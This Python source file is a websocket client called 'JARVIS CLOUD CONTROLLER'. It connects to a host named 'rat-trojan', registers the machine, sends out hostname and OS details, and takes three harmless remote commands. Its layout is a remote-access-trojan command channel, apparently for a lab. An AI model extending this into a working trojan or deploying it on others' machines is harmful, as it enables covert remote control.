import asyncio
import json
import os
import platform
import socket
import time
import uuid

import websockets


# ============================================================
# CONFIG
# ============================================================

RENDER_URL = "wss://rat-trojan.onrender.com/ws"

PC_DEVICE_ID = "pc-main"

PAIRING_SECRET = "LAB-123456"

HEARTBEAT_INTERVAL = 10

RECONNECT_DELAY = 5


# ============================================================
# GLOBAL STATE
# ============================================================

websocket = None

connected = False

registered = False

devices = {}


# ============================================================
# SYSTEM INFO
# ============================================================

def get_pc_info():

    return {
        "hostname": socket.gethostname(),
        "platform": platform.system(),
        "platform_release": platform.release(),
        "platform_version": platform.version(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "python_version": platform.python_version(),
        "agent_status": "active",
        "timestamp": time.time(),
    }


# ============================================================
# SEND JSON
# ============================================================

async def send_json(data):

    global websocket

    if websocket is None:
        return False

    try:

        await websocket.send(
            json.dumps(data)
        )

        return True

    except Exception as exc:

        print(
            f"[SEND ERROR] {exc}"
        )

        return False


# ============================================================
# REGISTER PC
# ============================================================

async def register_pc():

    print("[RENDER] Registering PC...")

    return await send_json(
        {
            "type": "pc_register",
            "device_id": PC_DEVICE_ID,
            "device_type": "pc",
            "secret": PAIRING_SECRET,
        }
    )


# ============================================================
# SEND HEARTBEAT
# ============================================================

async def heartbeat_loop():

    while connected:

        await asyncio.sleep(
            HEARTBEAT_INTERVAL
        )

        if not connected:
            break

        await send_json(
            {
                "type": "heartbeat"
            }
        )


# ============================================================
# REQUEST DEVICE LIST
# ============================================================

async def request_devices():

    await send_json(
        {
            "type": "list_devices"
        }
    )


# ============================================================
# PRINT DEVICES
# ============================================================

def print_devices():

    print()
    print("DEVICES")

    print(
        f"{'DEVICE ID':<28}"
        f"{'TYPE':<12}"
        f"{'STATUS':<12}"
    )

    print("-" * 70)

    if not devices:

        print("No devices registered.")

        return

    for device_id, device in devices.items():

        status = str(
            device.get(
                "status",
                "offline",
            )
        )

        device_type = str(
            device.get(
                "device_type",
                "unknown",
            )
        )

        print(
            f"{device_id:<28}"
            f"{device_type:<12}"
            f"{status:<12}"
        )

    print()


# ============================================================
# COMMAND
# ============================================================

async def send_command(
    target_device_id,
    command,
    args=None,
):

    if args is None:
        args = {}

    command_id = (
        "cmd-"
        + uuid.uuid4().hex[:8]
    )

    payload = {
        "type": "command",
        "device_id": target_device_id,
        "command_id": command_id,
        "command": command,
        "args": args,
    }

    print()
    print(
        f"[COMMAND] {command}"
    )

    sent = await send_json(
        payload
    )

    if sent:

        print(
            f"[COMMAND] sent "
            f"id={command_id}"
        )

    else:

        print(
            "[COMMAND] failed"
        )


# ============================================================
# HANDLE DEVICES
# ============================================================

def handle_devices(data):

    global devices

    devices = {}

    for device in data.get(
        "devices",
        []
    ):

        device_id = device.get(
            "device_id"
        )

        if device_id:

            devices[
                device_id
            ] = device

    print_devices()


# ============================================================
# HANDLE COMMAND
# ============================================================

async def handle_command(data):

    command = data.get(
        "command"
    )

    command_id = data.get(
        "command_id"
    )

    source_device_id = data.get(
        "source_device_id"
    )

    args = data.get(
        "args",
        {}
    )

    print()
    print(
        f"[COMMAND RECEIVED] "
        f"{command}"
    )

    # --------------------------------------------------------
    # DEVICE INFO
    # --------------------------------------------------------

    if command == "device_info":

        response = {
            "type": "command_response",
            "success": True,
            "command_id": command_id,
            "source_device_id": source_device_id,
            "result": get_pc_info(),
        }

        await send_json(
            response
        )

        return

    # --------------------------------------------------------
    # CONNECTION STATUS
    # --------------------------------------------------------

    if command == "connection_status":

        response = {
            "type": "command_response",
            "success": True,
            "command_id": command_id,
            "source_device_id": source_device_id,
            "result": {
                "connected": connected,
                "registered": registered,
                "timestamp": time.time(),
            },
        }

        await send_json(
            response
        )

        return

    # --------------------------------------------------------
    # PING
    # --------------------------------------------------------

    if command == "ping":

        response = {
            "type": "command_response",
            "success": True,
            "command_id": command_id,
            "source_device_id": source_device_id,
            "result": {
                "message": "pong",
                "timestamp": time.time(),
            },
        }

        await send_json(
            response
        )

        return

    # --------------------------------------------------------
    # UNKNOWN COMMAND
    # --------------------------------------------------------

    response = {
        "type": "command_response",
        "success": False,
        "command_id": command_id,
        "source_device_id": source_device_id,
        "message": (
            f"Unsupported command: "
            f"{command}"
        ),
    }

    await send_json(
        response
    )


# ============================================================
# HANDLE TEXT MESSAGE
# ============================================================

async def handle_text_message(message):

    global registered

    try:

        data = json.loads(
            message
        )

    except json.JSONDecodeError:

        print(
            "[RENDER] Invalid JSON"
        )

        return

    message_type = data.get(
        "type"
    )

    # --------------------------------------------------------
    # PC REGISTER RESPONSE
    # --------------------------------------------------------

    if message_type == "pc_register_response":

        if data.get("success"):

            registered = True

            print(
                "[RENDER] "
                "PC registered successfully"
            )

            # Send device info
            await send_json(
                {
                    "type": "device_info",
                    "info": get_pc_info(),
                }
            )

            # Request devices
            await request_devices()

        else:

            registered = False

            print(
                "[RENDER] "
                "PC registration failed:"
            )

            print(
                data.get(
                    "message",
                    "Unknown error",
                )
            )

        return

    # --------------------------------------------------------
    # DEVICES
    # --------------------------------------------------------

    if message_type == "devices":

        handle_devices(
            data
        )

        return

    # --------------------------------------------------------
    # HEARTBEAT RESPONSE
    # --------------------------------------------------------

    if message_type == "heartbeat_response":

        return

    # --------------------------------------------------------
    # PONG
    # --------------------------------------------------------

    if message_type == "pong":

        print(
            "[RENDER] PONG"
        )

        return

    # --------------------------------------------------------
    # COMMAND
    # --------------------------------------------------------

    if message_type == "command":

        await handle_command(
            data
        )

        return

    # --------------------------------------------------------
    # COMMAND RESPONSE
    # --------------------------------------------------------

    if message_type == "command_response":

        print()
        print(
            "[COMMAND RESPONSE]"
        )

        print(
            json.dumps(
                data,
                indent=2,
            )
        )

        return

    # --------------------------------------------------------
    # DEVICE INFO RESPONSE
    # --------------------------------------------------------

    if message_type == "device_info_response":

        print()
        print(
            "[DEVICE INFO]"
        )

        print(
            json.dumps(
                data,
                indent=2,
            )
        )

        return

    # --------------------------------------------------------
    # ERROR
    # --------------------------------------------------------

    if message_type == "error":

        print()
        print(
            "[SERVER ERROR]"
        )

        print(
            data.get(
                "message",
                "Unknown error",
            )
        )

        return

    # --------------------------------------------------------
    # PAIR RESPONSE
    # --------------------------------------------------------

    if message_type == "pair_response":

        print(
            "[PAIR RESPONSE]",
            data,
        )

        return

    # --------------------------------------------------------
    # UNKNOWN
    # --------------------------------------------------------

    print(
        "[RENDER] Unknown message:",
        data,
    )


# ============================================================
# RECEIVE LOOP
# ============================================================

async def receive_loop():

    global connected
    global registered

    try:

        async for message in websocket:

            if isinstance(
                message,
                bytes
            ):

                print(
                    "[RENDER] "
                    "Unexpected binary payload"
                )

                continue

            await handle_text_message(
                message
            )

    except websockets.ConnectionClosed as exc:

        print()
        print(
            "[RENDER] "
            "Connection closed:",
            exc,
        )

    except Exception as exc:

        print()
        print(
            "[RENDER] "
            "Receive error:",
            exc,
        )

    finally:

        connected = False
        registered = False


# ============================================================
# CONNECT
# ============================================================

async def connect_to_render():

    global websocket
    global connected
    global registered

    print()
    print(
        "[RENDER] Connecting..."
    )

    try:

        websocket = await websockets.connect(
            RENDER_URL,
            ping_interval=20,
            ping_timeout=20,
            close_timeout=5,
            max_size=16 * 1024 * 1024,
        )

        connected = True
        registered = False

        print(
            "[RENDER] Connected"
        )

        await register_pc()

        receive_task = asyncio.create_task(
            receive_loop()
        )

        heartbeat_task = asyncio.create_task(
            heartbeat_loop()
        )

        done, pending = await asyncio.wait(
            [
                receive_task,
                heartbeat_task,
            ],
            return_when=asyncio.FIRST_COMPLETED,
        )

        for task in pending:

            task.cancel()

        for task in done:

            try:
                await task

            except asyncio.CancelledError:
                pass

    except Exception as exc:

        connected = False
        registered = False

        print()
        print(
            "[RENDER] "
            "Connection failed:",
            exc,
        )

    finally:

        connected = False
        registered = False

        try:

            if websocket:

                await websocket.close()

        except Exception:
            pass

        websocket = None

        print(
            "[RENDER] Disconnected"
        )


# ============================================================
# COMMAND LOOP
# ============================================================

async def command_loop():

    print()
    print(
        "================================"
    )
    print(
        " JARVIS CLOUD CONTROLLER"
    )
    print(
        "================================"
    )

    print()
    print(
        "Commands:"
    )

    print(
        "  devices"
    )

    print(
        "  refresh"
    )

    print(
        "  info"
    )

    print(
        "  ping"
    )

    print(
        "  status"
    )

    print(
        "  clear"
    )

    print(
        "  exit"
    )

    print()

    while True:

        try:

            command = await asyncio.to_thread(
                input,
                "JARVIS> "
            )

        except EOFError:

            return

        except KeyboardInterrupt:

            return

        command = command.strip()

        if not command:
            continue

        # ----------------------------------------------------
        # EXIT
        # ----------------------------------------------------

        if command.lower() in {
            "exit",
            "quit",
        }:

            return

        # ----------------------------------------------------
        # CLEAR
        # ----------------------------------------------------

        if command.lower() == "clear":

            os.system(
                "cls"
                if os.name == "nt"
                else "clear"
            )

            continue

        # ----------------------------------------------------
        # DEVICES
        # ----------------------------------------------------

        if command.lower() in {
            "devices",
            "refresh",
        }:

            if connected:

                await request_devices()

            else:

                print(
                    "[JARVIS] "
                    "Not connected"
                )

            continue

        # ----------------------------------------------------
        # INFO
        # ----------------------------------------------------

        if command.lower() == "info":

            await send_command(
                PC_DEVICE_ID,
                "device_info",
            )

            continue

        # ----------------------------------------------------
        # PING
        # ----------------------------------------------------

        if command.lower() == "ping":

            await send_command(
                PC_DEVICE_ID,
                "ping",
            )

            continue

        # ----------------------------------------------------
        # STATUS
        # ----------------------------------------------------

        if command.lower() == "status":

            print()
            print(
                "CONNECTION STATUS"
            )

            print(
                f"Connected : "
                f"{connected}"
            )

            print(
                f"Registered: "
                f"{registered}"
            )

            print(
                f"Devices   : "
                f"{len(devices)}"
            )

            print()

            continue

        # ----------------------------------------------------
        # UNKNOWN
        # ----------------------------------------------------

        print(
            "Unknown command."
        )


# ============================================================
# MAIN
# ============================================================

async def main():

    global connected

    command_task = asyncio.create_task(
        command_loop()
    )

    while True:

        if command_task.done():

            break

        if not connected:

            await connect_to_render()

            if command_task.done():

                break

            print(
                f"[RENDER] "
                f"Reconnecting in "
                f"{RECONNECT_DELAY}s..."
            )

            await asyncio.sleep(
                RECONNECT_DELAY
            )

    if not command_task.done():

        command_task.cancel()

        try:

            await command_task

        except asyncio.CancelledError:

            pass


# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":

    try:

        asyncio.run(
            main()
        )

    except KeyboardInterrupt:

        print()
        print(
            "JARVIS stopped."
        )